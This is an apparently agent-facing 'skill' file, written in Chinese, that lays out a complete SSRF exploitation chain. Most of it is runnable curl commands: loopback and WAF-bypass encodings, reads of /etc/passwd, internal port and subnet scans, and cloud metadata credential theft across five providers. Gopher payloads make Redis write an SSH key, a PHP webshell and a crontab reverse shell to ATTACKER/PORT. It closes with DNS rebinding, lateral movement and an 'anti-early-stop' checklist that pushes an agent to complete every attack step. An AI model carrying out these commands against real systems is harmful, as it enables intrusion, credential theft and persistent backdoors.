---
name: ssrf-internal-mapping
description: SSRF exploitation chain from protocol enumeration through cloud metadata theft to internal network lateral movement
version: 1.0.0
---

# SSRF 内网测绘

## 适用场景

发现疑似 SSRF 触发点后加载。覆盖协议枚举 → 端口扫描 → 内网 C 段 → 云元数据 → 云凭据窃取 → 中间件未授权 → gopher 武器化 → DNS rebinding → 横向移动完整链。

## 前置 skill

- waf-detection-and-fingerprinting (强制)
- waf-bypass-arsenal (强制)

## 攻击链

### 1) SSRF 触发确认

目标: 确认服务端发起外部请求可控

```bash
# 直连版 — 用回环地址探测
curl -sk "https://TARGET/fetch?url=http://127.0.0.1:80/" -D -
curl -sk "https://TARGET/fetch?url=http://[::1]:80/" -D -
curl -sk "https://TARGET/fetch?url=http://0x7f000001:80/" -D -

# 代理版
curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 "https://TARGET/fetch?url=http://127.0.0.1:80/" -D -
```

WAF 绕过变体:
```
http://127.0.0.1 → http://2130706433 (十进制)
http://127.0.0.1 → http://0x7f.0x00.0x00.0x01 (十六进制)
http://127.0.0.1 → http://0177.0.0.01 (八进制)
http://127.0.0.1 → http://127.1 (短格式)
http://127.0.0.1 → http://[::ffff:127.0.0.1] (IPv6 映射)
http://127.0.0.1 → http://①②⑦.⓪.⓪.① (Unicode)
http://localhost → http://localtest.me (DNS 解析到 127.0.0.1)
```

成功信号: 返回本地服务内容 / 响应时间差异 / 报错信息泄露内网
失败 plan B: 切协议 / 用 DNS rebinding / 用短链接重定向

### 2) 协议枚举

```bash
# 逐协议探测
curl -sk "https://TARGET/fetch?url=http://127.0.0.1:80/"
curl -sk "https://TARGET/fetch?url=https://127.0.0.1:443/"
curl -sk "https://TARGET/fetch?url=file:///etc/passwd"
curl -sk "https://TARGET/fetch?url=dict://127.0.0.1:6379/info"
curl -sk "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_INFO%0d%0a"
curl -sk "https://TARGET/fetch?url=ftp://127.0.0.1:21/"
curl -sk "https://TARGET/fetch?url=ldap://127.0.0.1:389/"
```

### 3) 内网端口扫描

```bash
# 常见端口批量探测
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017 2375 8500 2181 11211 5672 15672 9090 3000 4443 10250; do
  curl -sk -o /dev/null -w "%{http_code} %{time_total}" "https://TARGET/fetch?url=http://127.0.0.1:${port}/" 2>/dev/null
  echo " -> port $port"
done
```

### 4) 内网 C 段探测

```bash
# 探测内网网关常见段
for net in 10.0.0 10.1.0 172.16.0 172.17.0 192.168.0 192.168.1; do
  for host in 1 2 3 10 50 100 200 254; do
    curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/fetch?url=http://${net}.${host}:80/" 2>/dev/null
    echo " -> ${net}.${host}"
  done
done
```

### 5) 云元数据全家桶

```bash
# AWS
curl -sk "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -sk "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -sk "https://TARGET/fetch?url=http://169.254.169.254/latest/user-data/"

# GCP
curl -sk "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true" -H "Metadata-Flavor: Google"

# Azure
curl -sk "https://TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"

# 阿里云
curl -sk "https://TARGET/fetch?url=http://100.100.100.200/latest/meta-data/"
curl -sk "https://TARGET/fetch?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/"

# 腾讯云
curl -sk "https://TARGET/fetch?url=http://metadata.tencentyun.com/latest/meta-data/"
```

### 6) 中间件未授权探测

```bash
# Redis
curl -sk "https://TARGET/fetch?url=dict://127.0.0.1:6379/info"

# Elasticsearch
curl -sk "https://TARGET/fetch?url=http://127.0.0.1:9200/_cat/indices"

# Consul
curl -sk "https://TARGET/fetch?url=http://127.0.0.1:8500/v1/agent/members"

# etcd
curl -sk "https://TARGET/fetch?url=http://127.0.0.1:2379/v2/keys/"

# Docker API
curl -sk "https://TARGET/fetch?url=http://127.0.0.1:2375/containers/json"

# Kubernetes API
curl -sk "https://TARGET/fetch?url=https://127.0.0.1:10250/pods"

# MongoDB
curl -sk "https://TARGET/fetch?url=http://127.0.0.1:27017/"

# ZooKeeper
curl -sk "https://TARGET/fetch?url=http://127.0.0.1:2181/"
```

### 7) gopher 武器化 (Redis 写 SSH key / webshell / crontab)

```bash
# Redis 写 SSH key (gopher 协议)
curl -sk "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20x%20%22%5Cn%5Cnssh-rsa%20AAAAB3...PUBLIC_KEY...%20root%40pwn%5Cn%5Cn%22%0d%0aCONFIG%20SET%20dir%20/root/.ssh/%0d%0aCONFIG%20SET%20dbfilename%20authorized_keys%0d%0aSAVE%0d%0a"

# Redis 写 webshell
curl -sk "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system(%24_GET%5B'cmd'%5D)%3B%3F%3E%22%0d%0aCONFIG%20SET%20dir%20/var/www/html/%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSAVE%0d%0a"

# Redis 写 crontab
curl -sk "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_SET%20cron%20%22%5Cn%5Cn*%20*%20*%20*%20*%20bash%20-i%20%3E%26%20/dev/tcp/ATTACKER/PORT%200%3E%261%5Cn%5Cn%22%0d%0aCONFIG%20SET%20dir%20/var/spool/cron/%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSAVE%0d%0a"
```

### 8) DNS rebinding

```bash
# 利用 DNS rebinding 绕过 SSRF 白名单
# 第一次解析到合法 IP,第二次解析到 127.0.0.1
curl -sk "https://TARGET/fetch?url=http://rebind.ATTACKER_DOMAIN/"
```

### 9) 横向移动

根据内网发现的服务和凭据,展开横向:
- 云凭据 → 调用云 API 枚举资产
- Redis/Docker/K8s 未授权 → 直接 RCE
- 内网 Web 服务 → 二次 SSRF / 直接利用已知漏洞

## WAF 对抗集成

### SSRF URL 绕过 (WAF 阻止内网地址时)

```
http://127.0.0.1 → http://2130706433 → http://017700000001 → http://127.1
http://169.254.169.254 → http://[::ffff:a9fe:a9fe] → http://2852039166
短链接重定向: 在 SSRF 触发点填入自控 302 跳转 URL
DNS rebinding: 自建域名第一次解析公网 IP 第二次解析内网 IP
URL 编码: http://%31%32%37%2e%30%2e%30%2e%31
```

### 按 WAF 厂商适配

| WAF 厂商 | 绕过策略 |
|----------|---------|
| Cloudflare | IPv6 映射 + DNS rebinding + 短链接 302 |
| 阿里云盾 | 十进制 IP + URL 编码 + 协议切换 |
| 安全狗 | 八进制 IP + Unicode + 短格式 |
| 通用 | 逐一尝试: 十进制 → 十六进制 → 八进制 → IPv6 → DNS rebinding |

## 代理池启用判定

- SSRF 探测本身需要直连 (从目标服务器发起请求)
- 发送触发 SSRF 的请求到目标时,若 WAF 拦截 → 走代理
- 云元数据 / 内网横向阶段 → 强制直连 (请求由目标发起)

## 敏感数据采集点

- 凭据类: 云 AK/SK / IAM 凭据 / Redis 密码 / 数据库连接串
- 系统类: 内网 IP 拓扑 / 端口开放 / 中间件版本 / 云实例配置
- 账户类: user-data 中的引导脚本 / 配置中的凭据

## 失败处理

1. SSRF 只支持 HTTP → 放弃 gopher/dict,用 HTTP 端口扫描 + 云元数据
2. 内网地址被过滤 → 用 DNS rebinding / 302 重定向 / IP 进制转换
3. 云元数据 v2 需要 Token → 先获取 Token 再请求
4. gopher 协议不支持 → 转 HTTP 协议利用 Redis HTTP API
5. 所有内网探测无响应 → 确认非 blind SSRF,转 OOB 外带

## 报告必填字段

- 漏洞标题 / 漏洞指纹
- 完整 PoC (含 SSRF URL)
- WAF 类型 + 绕过路径
- 内网拓扑发现 (IP + 端口 + 服务)
- 云凭据提取结果
- 中间件未授权利用结果
- 横向移动路径
- 敏感数据清单
- 影响半径
- CVSS 3.1 + 向量串
- 修复建议 / 攻击时间线

## 反早停检查

1. 是否完成了云元数据全家桶 (AWS/GCP/Azure/阿里/腾讯) 探测?
2. 是否对内网常见端口和 C 段做了扫描?
3. 是否对发现的中间件尝试了未授权利用?
